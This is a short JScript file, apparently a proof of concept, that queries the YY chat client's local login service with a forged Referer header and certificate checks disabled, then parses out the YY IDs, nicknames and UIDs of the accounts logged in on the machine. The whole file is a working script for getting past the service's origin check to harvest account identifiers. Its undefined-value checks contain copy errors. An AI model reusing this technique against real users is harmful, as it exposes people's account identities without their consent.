/*!visitor @author wade-zh. Study only and do not support browsing outside the IE kernel.*/
function Visitor() {
    var internalNetwork = {
        fetchClients: function () {
            var url = "https://local.ylogin.yy.com:6108/pt_get_list?callback=pt_get_list";
            var obj = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            obj.Open("GET", url, false);
            // noinspection JSAnnotator
            obj.Option(4) = 13056;
            // noinspection JSAnnotator
            obj.Option(6) = false;
            obj.setRequestHeader("Referer", "https://lgn.yy.com/lgn/oauth/authorize.do");
            obj.Send();
            return obj.responseText;
        }
    }
    this.getUsers = function () {
        var result = internalNetwork.fetchClients() + "&P&";
        var arr = result.split(",");
        var users = new Array();
        for (var i=0; i < arr.length; i++){
            var block = arr[i];
            var match1 = block.match(/YYID:(\S*)NICK/);
            var match2 = block.match(/NICK:(\S*)UID/);
            var match3 = block.match(/UID:(\S*)VER/);
            var imid, nick, uid;
            if (imid == undefined) imid = null;
            if (nick == undefined) imid = null;
            if (uid == undefined) imid = null;
            if (match1 != null && match1.length >= 1) imid = match1[1].replace('\\n','').replace('\n','')
            if (match2 != null && match2.length >= 1) nick = match2[1].replace('\\\\','\\').replace('\\n','').replace('\n','')
            if (match3 != null && match3.length >= 1) uid = match3[1].replace('\\n','').replace('\n','')
            var user = new User();
            user.imid = imid;
            user.nick = nick;
            user.uid = uid;
            users.push(user)
        }
        return users;
    }
}

function User() {
    this.imid = 0;
    this.nick = "";
    this.uid = 0;
}